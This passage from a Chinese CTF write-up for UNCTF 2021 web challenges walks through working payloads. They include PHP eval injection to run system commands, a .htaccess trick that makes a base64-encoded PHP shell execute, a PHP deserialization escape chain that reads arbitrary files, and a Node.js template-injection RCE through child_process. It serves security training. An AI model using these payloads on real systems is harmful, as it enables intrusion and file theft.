class="keyword">die</span>(<span class="string">&quot;数据库地址不能为空！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$db_host</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;fakeflag is /flag&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_user</span>) || preg_match(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_pwd</span>) || preg_match(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_port</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;嘉然今天吃什么&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;mysql -h <span class="subst">$db_host</span> -u <span class="subst">$db_user</span> -p <span class="subst">$db_pwd</span> -P <span class="subst">$db_port</span> --enable-local-infile&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;Maybe you can do someting else&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$db_user</span>) || !<span class="keyword">isset</span>(<span class="variable">$db_pwd</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo new Exception(\&quot;&lt;script&gt;alert(&#x27;关注嘉然，顿顿解馋！！！&#x27;);&lt;/script&gt;\&quot;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$db_user</span> = str_ireplace(<span class="string">&quot;SplFileObject&quot;</span>, <span class="string">&quot;UNCTF2021&quot;</span>, <span class="variable">$db_user</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$db_user</span>(<span class="subst">$db_pwd</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></blockquote><p>利用最后 <code>eval(&quot;echo new $db_user($db_pwd);&quot;);</code> 的拼接特性，用类 <code>DirectoryIterator</code> 列目录后，再RCE。</p><p>Payload：</p><p>POST传参 <code>host=x&amp;pwd=y&amp;port=z&amp;user=DirectoryIterator(&quot;glob:///*&quot;);system(&quot;cat /fllllaaaaag&quot;);//</code></p><p>​    </p><h3 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!is_dir(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">&quot;/ph|\.\.|\//i&quot;</span>, <span class="variable">$filename</span>) || strlen(<span class="variable">$filename</span>) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">&quot;/&lt;\?|ph/&quot;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$sandbox</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    @file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>传入文件名和内容写文件，禁用的关键字禁掉了伪协议、目录穿越、常规PHP头和写PHP文件。</p><p>由于sandbox内无现成PHP文件，考虑写 <code>.htaccess</code> 文件将普通文件以PHP文件解析。</p><p>文件内无法写入PHP代码，可以先写入base64编码字符串后，再利用 <code>.htaccess</code> 文件伪协议解析即可， <code>.htaccess</code> 文件中的用到的 <code>php</code> 关键字用 <code>\</code> 换行绕过。</p><p> <code>.htaccess</code> 文件内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br><span class="line">p\</span><br><span class="line">hp_value auto_append_file &quot;p\</span><br><span class="line">hp://filter/convert.base64-decode/resource=1.jpg&quot;</span><br></pre></td></tr></table></figure><p>Payload：</p><p><code>http://xxx/?filename=.htaccess&amp;content=AddType%20application/x-httpd-p\%0ahp%20.jpg%0ap\%0ahp_value%20auto_append_file%20&quot;p\%0ahp://filter/convert.base64-decode/resource=1.jpg&quot;</code></p><p><code>http://xxx/?filename=1.jpg&amp;content=PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs%2FPg%3D%3D</code></p><p>最后访问 <code>1.jpg</code> 得到flag。</p><p>​    </p><h3 id="easy-serialize"><a href="#easy-serialize" class="headerlink" title="easy_serialize"></a>easy_serialize</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="variable">$action</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        highlight_file(<span class="string">&#x27;function.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>) &amp;&amp; <span class="variable">$a</span> !=<span class="variable">$b</span>)&#123;</span><br><span class="line">    unserialize(filter(<span class="variable">$s</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>POST传入 <code>action=1</code>，得到 <code>function.php</code> 源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">me7eorite</span></span>&#123;</span><br><span class="line">    <span class="comment">//test  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$safe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;safe = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> UNCTF(<span class="string">&#x27;me7eorite&#x27;</span>,<span class="string">&#x27;me7eorite@qq.com&#x27;</span>,<span class="string">&#x27;me7eorite&#x27;</span>);           </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getShell();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getShell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;safe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UNCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass  = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getShell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;this_is_fake&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name . <span class="string">&#x27;Welcome to UNCTF 2021!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层，PHP弱比较特性，数组绕过，传入 <code>?a[]=1&amp;b[]=2</code>；</p><p>第二层，PHP序列化+反序列化，<code>filter()</code> 删除三种关键字，明显的减字符型反序列化逃逸。</p><p>本地测试，先正常POST传值 <code>name=z&amp;pass=x&amp;email=y</code>，得到序列化字符串：</p><p><code>O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:3:&quot;x&quot;;s:5:&quot;email&quot;;s:3:&quot;y&quot;;s:4:&quot;name&quot;;s:3:&quot;z&quot;;&#125;</code>。</p><p>观察利用链：类<code>UNCTF</code> 的 <code>__destruct()</code> 中，控制 <code>$this-&gt;name</code> 可以触发类 <code>me7eorite</code> 的 <code>__toString()</code>，控制 <code>$this-&gt;class</code> 为新的 <code>me7eorite</code> 对象，避免调用类 <code>UNCTF</code> 的 <code>getShell()</code>，而调用类 <code>me7eorite</code> 的 <code>getShell()</code>，再控制 <code>$this-&gt;safe</code> 可任意读。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$y</span> = <span class="keyword">new</span> me7eorite;</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> me7eorite;</span><br><span class="line"><span class="variable">$x</span>-&gt;safe = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;class = <span class="variable">$y</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$x</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:1:&quot;y&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>由于能POST传入的只有序列化部分的类 <code>UNCTF</code> 参数，可以通过给 <code>name</code> 传入恶意序列化字符串，<code>serialize()</code> 后截断正常的序列化字符串；给<code>email</code> 传入过滤关键字，<code>filter()</code> 之后使原有长度值与需去除的正常字符串长度相等，保留恶意序列化字符串，最后经 <code>unserialize()</code> 控制反序列化过程完成利用链。</p><p>尝试传值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;phpphp&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:6:&quot;phpphp&quot;;s:4:&quot;name&quot;;s:245:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;【&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;】截断</span></span><br></pre></td></tr></table></figure><p>计算需去除的正常字符串 <code>&quot;;s:4:&quot;name&quot;;s:245:&quot;z</code> 长度为21，则使得原有长度值与需去除的正常字符串长度相等，则需要 <code>21/len(&#39;php&#39;)=21/3=7</code> 个 <code>php</code> ，再将 <code>/etc/passwd</code> 换成 <code>/flag</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;phpphpphpphpphpphpphp&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;name&quot;;s:231:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;【&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;】截断</span></span><br></pre></td></tr></table></figure><p>注意 <code>flag</code> 也被过滤，双写绕过即可。</p><p>Payload：</p><p><code>http://xxx?a[]=1&amp;b[]=2</code>，POST传参 </p><p><code>name=z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&amp;pass=x&amp;email=phpphpphpphpphpphpphp</code></p><p>flag：<code>UNCTF&#123;bc9b3f89-bed6-4bc3-a211-b9eed8612af7&#125;</code></p><p>​    </p><h3 id="nodejs-ssti"><a href="#nodejs-ssti" class="headerlink" title="nodejs_ssti"></a>nodejs_ssti</h3><p>一个输入框和提交按钮，尝试SSTI输入 <code>&#123;&#123;2*3&#125;&#125;</code> ，发现利用点在title值。</p><p>尝试 <code>&#123;&#123;print(xx)&#125;&#125;</code> 出现报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: getValue(...) is not a function</span><br><span class="line">    at sodaExp (eval at getEvalFunc (/app/node_modules/sodajs/dist/soda.js:266:28), &lt;anonymous&gt;:1:63)</span><br><span class="line">    at Soda.parseSodaExpression (/app/node_modules/sodajs/dist/soda.js:403:42)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:188:44</span><br><span class="line">    at String.replace (&lt;anonymous&gt;)</span><br><span class="line">    at compile (/app/node_modules/sodajs/dist/soda.js:187:53)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:257:21</span><br><span class="line">    at Array.map (&lt;anonymous&gt;)</span><br><span class="line">    at compile (/app/node_modules/sodajs/dist/soda.js:256:55)</span><br><span class="line">    at Soda.compileNode (/app/node_modules/sodajs/dist/soda.js:261:13)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:130:23</span><br></pre></td></tr></table></figure><p>说明代码使用的是soda.js，实际是node.js注入，利用node.js特性使用 <code>child_process</code> 调用 <code>execSync()</code> 方法RCE。</p><p>Payload：</p><p><code>http://xxx/who</code></p><p>POST传参 <code>name=&#123;&#123;" ".toString.constructor("return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()")()&#125;&#125;&amp;brand=web</code></p><p>flag：<code>UNCTF&#123;45d9452b-630a-4ffa-b963-f0da57cf0e79&#125;</code></p><p>​    </p><h3 id="encrypt-login"><a href="#encrypt-login" class="headerlink" title="encrypt_login"></a>encrypt_login</h3><blockquote><p>听说你很擅长撞库？</p></blockquote><p>随便输入用户名密码，返回提示密码为纯数字：</p><p><code>I can tell you my name is admin and my password is made by number only. This time, you can not to buster my password :)</code></p><p>查看源码发现前端加密js文件 <code>encrypto.js</code>，代码已混淆，根据 <code>jsjiami.com.v6</code> 字样，使用 <a href="https://jsdec.js.org/">JSDec</a> 在线解混淆有：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Progcessed By JSDec in 0.01s</span></span><br><span class="line"><span class="comment"> *JSDec - JSDec.js.org</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$(<span class="string">&#x27;#submit&#x27;</span>)[<span class="string">&#x27;click&#x27;</span>](<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x326c0f = &#123;</span><br><span class="line">        <span class="string">&#x27;DTeqY&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x1553aa, _0x4bb167</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x1553aa == _0x4bb167;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span 